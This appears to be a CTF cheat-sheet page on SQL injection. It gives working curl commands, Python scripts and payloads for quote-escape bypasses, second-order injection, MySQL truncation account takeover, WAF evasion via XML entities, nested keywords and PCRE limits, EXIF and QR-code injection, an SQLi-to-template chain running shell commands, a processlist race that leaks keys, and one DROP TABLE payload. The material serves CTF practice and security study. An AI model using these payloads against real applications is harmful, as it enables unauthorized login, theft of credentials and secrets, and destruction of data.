# CTF Web - SQL Injection Techniques

Comprehensive SQL injection techniques for CTF challenges. For other server-side attacks (SSTI, SSRF, XXE, command injection, GraphQL), see [server-side.md](server-side.md).

## Table of Contents
- [Backslash Escape Quote Bypass](#backslash-escape-quote-bypass)
- [Hex Encoding for Quote Bypass](#hex-encoding-for-quote-bypass)
- [Second-Order SQL Injection](#second-order-sql-injection)
- [SQLi LIKE Character Brute-Force](#sqli-like-character-brute-force)
- [MySQL Column Truncation (VolgaCTF 2014)](#mysql-column-truncation-volgactf-2014)
- [SQLi to SSTI Chain](#sqli-to-ssti-chain)
- [MySQL information_schema.processList Trick](#mysql-information_schemaprocesslist-trick)
- [WAF Bypass via XML Entity Encoding (Crypto-Cat)](#waf-bypass-via-xml-entity-encoding-crypto-cat)
- [SQLi via EXIF Metadata Injection (29c3 CTF 2012)](#sqli-via-exif-metadata-injection-29c3-ctf-2012)
- [Shift-JIS Encoding SQL Injection (Boston Key Party 2016)](#shift-jis-encoding-sql-injection-boston-key-party-2016)
- [SQL Injection via QR Code Input (H4ckIT CTF 2016)](#sql-injection-via-qr-code-input-h4ckit-ctf-2016)
- [SQL Double-Keyword Filter Bypass (DefCamp CTF 2016)](#sql-double-keyword-filter-bypass-defcamp-ctf-2016)
- [MySQL Session Variable for Dual-Value Injection (MeePwn CTF 2017)](#mysql-session-variable-for-dual-value-injection-meepwn-ctf-2017)
- [PHP PCRE Backtrack Limit WAF Bypass (SECUINSIDE 2017)](#php-pcre-backtrack-limit-waf-bypass-secuinside-2017)
- [information_schema.processlist Race Condition Leak (SECUINSIDE 2017)](#information_schemaprocesslist-race-condition-leak-secuinside-2017)

---


## Backslash Escape Quote Bypass
```bash
# Query: SELECT * FROM users WHERE username='$user' AND password='$pass'
# With username=\ : WHERE username='\' AND password='...'
curl -X POST http://target/login -d 'username=\&password= OR 1=1-- '
curl -X POST http://target/login -d 'username=\&password=UNION SELECT value,2 FROM flag-- '
```

## Hex Encoding for Quote Bypass
```sql
SELECT 0x6d656f77;  -- Returns 'meow'
-- Combined with UNION for SSTI injection:
username=asd\&password=) union select 1, 0x7b7b73656c662e5f5f696e69745f5f7d7d#
```

## Second-Order SQL Injection
**Pattern (Second Breakfast):** Inject SQL in username during registration, triggers on profile view.
1. Register with malicious username: `' UNION select flag, CURRENT_TIMESTAMP from flags where 'a'='a`
2. Login normally
3. View profile → injected SQL executes in query using stored username

```python
import requests

s = requests.Session()

# Step 1: Store malicious payload (safely escaped during INSERT)
s.post("https://target.com/register", data={
    "username": "admin'-- -",
    "password": "anything"
})

# Step 2: Trigger — payload retrieved from DB and used unsafely
# Common triggers: password change, profile update, search using stored value
s.post("https://target.com/change-password", data={
    "old_password": "anything",
    "new_password": "hacked"
})
# UPDATE users SET password='hacked' WHERE username='admin'-- -'
# Result: admin password changed
```

**Key insight:** Second-order SQLi occurs when input is safely stored but later retrieved and used in a new query without escaping. Look for registration→profile update flows, stored preferences used in queries, or any feature that reads back user-controlled data from the database.

## SQLi LIKE Character Brute-Force
```python
password = ""
for pos in range(length):
    for c in string.printable:
        payload = f"' OR password LIKE '{password}{c}%' --"
        if oracle(payload):
            password += c; break
```

## MySQL Column Truncation (VolgaCTF 2014)

**Pattern:** Registration form backed by MySQL `VARCHAR(N)`. MySQL silently truncates strings longer than N characters, and ignores trailing spaces in string comparison. Register as `"admin" + spaces + junk` to create a duplicate "admin" row with an attacker-controlled password.

```bash
# VARCHAR(20) column — pad "admin" (5 chars) to exceed column width
# MySQL truncates to "admin               " → matches "admin" in comparisons

# Register duplicate admin with attacker password
curl -X POST http://target/register -d \
  'login=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x&password=attacker123'

# Login as admin with attacker password
curl -X POST http://target/login -d 'login=admin&password=attacker123'
```

**Why it works:**
1. MySQL `VARCHAR(N)` truncates input to N characters on INSERT
2. MySQL ignores trailing spaces in `=` comparisons (SQL standard PAD SPACE behavior)
3. `"admin" + 50 spaces + "x"` truncates to `"admin" + spaces` → matches `"admin"`
4. The application now has two rows matching "admin" — the original and the attacker's

**Key insight:** MySQL's PAD SPACE collation means `"admin" = "admin     "` evaluates to true. Combined with silent `VARCHAR` truncation, registering with a space-padded username creates a second account that the application treats as the original admin. This bypasses registration duplicate checks that use `WHERE username = ?` (since the padded version isn't an exact match before truncation). Fixed in MySQL 8.0+ with `NO_PAD` collations.

## SQLi to SSTI Chain
When SQLi result gets rendered in a template:
```python
payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
hex_payload = '0x' + payload.encode().hex()
# Final: username=x\&password=) union select 1, {hex_payload}#
```

## MySQL information_schema.processList Trick
```sql
SELECT info FROM information_schema.processList WHERE id=connection_id()
SELECT substring(info, 315, 579) FROM information_schema.processList WHERE id=connection_id()
```

## WAF Bypass via XML Entity Encoding (Crypto-Cat)
When SQL keywords (`UNION`, `SELECT`) are blocked by a WAF, encode them as XML hex character references. The XML parser decodes entities before the SQL engine processes the query:
```xml
<storeId>
  1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username &#x46;&#x52;&#x4f;&#x4d; users
</storeId>
```
This decodes to `1 UNION SELECT username FROM users` after XML processing.

**Encoding reference:**
| Keyword | XML Hex Entities |
|---------|-----------------|
| UNION | `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` |
| SELECT | `&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;` |
| FROM | `&#x46;&#x52;&#x4f;&#x4d;` |
| WHERE | `&#x57;&#x48;&#x45;&#x52;&#x45;` |

**Key insight:** WAF inspects raw XML bytes and blocks keyword patterns, but the XML parser decodes `&#xNN;` entities before passing values to the SQL layer. Any endpoint accepting XML input (SOAP, REST with XML body, stock check APIs) is a candidate.

**With sqlmap:** Use the `hexentities` tamper script. To prevent `&amp;` double-encoding of entities, modify `sqlmap/lib/request/connect.py`.

## SQLi via EXIF Metadata Injection (29c3 CTF 2012)

**Pattern:** Application extracts EXIF metadata from uploaded images (e.g., Comment, Artist, Description, Copyright) and inserts the values into SQL queries without sanitization. SQL payloads embedded in EXIF fields bypass WAFs that only inspect HTTP request bodies and URL parameters.

**Injecting SQL into EXIF fields:**
```bash
# Set EXIF Comment field to SQL payload
exiftool -Comment="' UNION SELECT password FROM users--" image.jpg

# Other injectable EXIF fields
exiftool -Artist="' OR 1=1--" image.jpg
exiftool -ImageDescription="'; DROP TABLE uploads;--" image.jpg
exiftool -Copyright="' UNION SELECT flag FROM flags--" image.jpg

# XMP metadata (often parsed by web applications)
exiftool -XMP-dc:Description="' UNION SELECT 1,2,3--" image.jpg
```

**Key insight:** Image galleries, photo management apps, and any upload endpoint that stores or displays EXIF data may feed metadata directly into SQL queries. WAFs and input filters typically inspect form fields and URL parameters but not binary file content. The EXIF fields survive re-encoding unless the application explicitly strips metadata (e.g., with `exiftool -all=`).

**Detection:** Upload endpoint that displays metadata (camera model, description, location) after upload. Check if special characters in EXIF fields cause SQL errors in the response.

## Shift-JIS Encoding SQL Injection (Boston Key Party 2016)

Multi-byte encoding mismatch bypasses escape functions. The yen sign (`\u00a5`) maps to backslash `0x5c` in Shift-JIS. A custom escape function adds backslash after yen, but in Shift-JIS context `\u00a5\` becomes `\\`, leaving the quote unescaped:

```javascript
socket.send('{"type":"get_answer","answer":"\\u00a5\\" OR 1=1 -- "}')
```

**Key insight:** Charset mismatch between escaping layer (Unicode) and database layer (Shift-JIS) defeats custom escape routines. Look for applications using non-UTF-8 character encodings (Shift-JIS, EUC-JP, GBK) where multi-byte characters contain `0x5c` (backslash) as a trailing byte.

## SQL Injection via QR Code Input (H4ckIT CTF 2016)

Applications that decode QR codes and use the contents in SQL queries create an injection vector through the QR image itself.

```python
import qrcode
import base64
import requests

# Generate QR code containing SQL injection payload
# Spaces may be filtered - use tabs instead
payload = "'\tunion\tselect\tsecret_field\tfrom\tmessages\twhere\tsecret_field\tlike\t'%flag%"

# Some apps use reversed base64: encode, reverse, then QR-encode
encoded = base64.b64encode(payload.encode()).decode().strip()
# reversed_encoded = encoded[::-1]  # if app reverses base64

# Generate QR code image
img = qrcode.make(payload)
img.save("sqli_qr.png")

# Upload QR code to target application
files = {'qr': open('sqli_qr.png', 'rb')}
r = requests.post('http://target/scan', files=files)
```

**Key insight:** QR codes are often trusted as "safe" input. When decoded QR content flows into SQL queries, standard SQLi techniques apply but with tab characters (`\t`) replacing spaces when space filtering is active. The QR encoding adds an obfuscation layer that may bypass WAFs.

## SQL Double-Keyword Filter Bypass (DefCamp CTF 2016)

Bypass SQL keyword filters that perform single-pass removal by nesting the keyword inside itself, so removal reveals the original keyword.

```text
# Filter removes "select" once from input
# Payload: sselectelect -> after removal -> select

# Full injection with nested keywords:
), ((selselectect * frofromm (seselectlect load_load_filefile('/flag')) as a limit 0, 1), '2') #

# Common nested bypass patterns:
# "select" blocked: sselectelect, seLselectECT
# "union"  blocked: ununionion
# "from"   blocked: frofromm
# "where"  blocked: whewherere
# "load_file" blocked: load_load_filefile
# "and"    blocked: aandnd
# "or"     blocked: oorr
```

**Key insight:** Single-pass keyword filters that replace/remove SQL keywords once are trivially bypassed by embedding the keyword within itself. The outer characters survive removal, reconstructing the forbidden keyword. Always test if the filter runs iteratively or just once.

## MySQL Session Variable for Dual-Value Injection (MeePwn CTF 2017)

When the same SQL parameter is evaluated in two sequential queries within a single database connection, MySQL session variables (`@var:=`) can return different values on each evaluation.

```sql
-- First eval returns 2, second returns 1
case when @wurst is null then @wurst:=2 else @wurst:=@wurst-1 end
```

**Example scenario:**
```sql
-- Application runs two queries with the same injected parameter:
-- Query 1: SELECT * FROM users WHERE role = [INJECTION]
-- Query 2: INSERT INTO log (action) VALUES ([INJECTION])
-- Need role=2 for admin in Query 1, but action=1 to avoid alert in Query 2

-- Injection:
' OR role = (case when @w is null then @w:=2 else @w:=@w-1 end) --
```

**Key insight:** Session variables persist across queries within a connection. Using `CASE WHEN @var IS NULL` initializes on first use and mutates on subsequent uses, allowing a single injection point to satisfy different conditions in sequential queries. This is useful when the same user input is interpolated into multiple SQL statements executed in sequence.

## PHP PCRE Backtrack Limit WAF Bypass (SECUINSIDE 2017)

PHP's `preg_match()` silently returns `false` (not `0`) when the PCRE backtrack limit is exceeded. Appending 1M+ characters to input forces backtracking beyond the default limit (1,000,000), causing the regex to fail to match.

```python
# Bypass preg_match WAF by exceeding backtrack limit
payload = "union select 1,2,3-- " + "a" * 1000001
# preg_match returns false (error) instead of 0 (no match)
# Most PHP code checks: if (!preg_match(...)) { allow; }
```

```php
// Vulnerable WAF pattern:
if (!preg_match('/union|select|from/i', $_GET['input'])) {
    // preg_match returns false on backtrack overflow
    // !false === true → WAF bypassed
    $result = mysql_query("SELECT * FROM data WHERE id = " . $_GET['input']);
}
```

**Key insight:** PHP's PCRE backtrack limit (`pcre.backtrack_limit`, default 1M) causes `preg_match()` to return `false` on overflow, which many WAFs treat as "no match" due to loose comparison (`!false == true`). The fix is to check `preg_match() === 0` (strict comparison) rather than `!preg_match()`. This works against any regex-based WAF in PHP that uses loose comparison on the return value.

## information_schema.processlist Race Condition Leak (SECUINSIDE 2017)

Race SQL injection against concurrent requests to leak data from `information_schema.processlist`, which shows currently executing queries including sensitive values like encryption keys.

```sql
-- Leak AES key from concurrent query via processlist
union select 1,(select INFO from information_schema.processlist
  where INFO like 0x256465637279707425),3,4 from board
-- The '%decrypt%' hex pattern matches the concurrent query containing the key
```

```python
import requests
import threading

# Race condition: fire injection while the app is running a sensitive query
def trigger_sensitive_query():
    """Application query that contains the AES key"""
    requests.get("http://target/decrypt?data=encrypted_blob")

def leak_processlist():
    """Injection that reads from processlist"""
    payload = "1 union select 1,(select INFO from information_schema.processlist where INFO like 0x256465637279707425),3,4-- "
    r = requests.get(f"http://target/search?id={payload}")
    if "AES_DECRYPT" in r.text:
        print(f"Leaked: {r.text}")

# Fire both concurrently
for _ in range(100):
    t1 = threading.Thread(target=trigger_sensitive_query)
    t2 = threading.Thread(target=leak_processlist)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
```

**Key insight:** `information_schema.processlist.INFO` exposes the full SQL text of all currently running queries on the MySQL server. By racing an injection query against a concurrent application query that references secrets, those secrets can be captured from the process list. This extends the existing `information_schema.processList` trick by adding a timing/race component to capture transient queries that contain secrets (encryption keys, passwords) only visible during execution.

---
